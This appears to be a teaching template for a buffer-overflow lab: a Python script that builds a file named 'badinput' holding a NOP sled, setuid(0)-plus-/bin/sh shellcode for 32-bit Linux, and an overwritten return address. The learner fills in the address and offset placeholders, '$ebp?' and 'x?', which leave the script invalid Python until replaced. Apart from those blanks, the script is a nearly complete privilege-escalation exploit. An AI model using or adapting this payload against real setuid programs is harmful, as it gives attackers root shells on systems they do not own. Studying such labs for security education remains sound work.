#!/usr/bin/python3
import sys

#setuid(0) + local shellcode from http://shell-storm.org/shellcode/files/shellcode-219.php
shellcode=(
  "\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"
  "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
  "\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
  "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
).encode('latin-1')

# First, fill the input string with NOP's
content = bytearray(0x90 for i in range(300)) 

# Put the shellcode at the end of the input string
start = 300 - len(shellcode) 
content[start:] = shellcode

# Set the new return address to $ebp + 100: do subsitute the $ebp? below with your machine's actual $ebp 
retaddr = $ebp? + 100   

# Replace the original return address at location $ebp-&buffer+4 (for a 32-bit machine): 
# do substitute the x? below with your machine's distance between $ebp and target buffer
offset = x? + 4
content[offset:offset+4] = (retaddr).to_bytes(4,byteorder='little') 

# Write the content to a file
with open('badinput', 'wb') as f:
  f.write(content)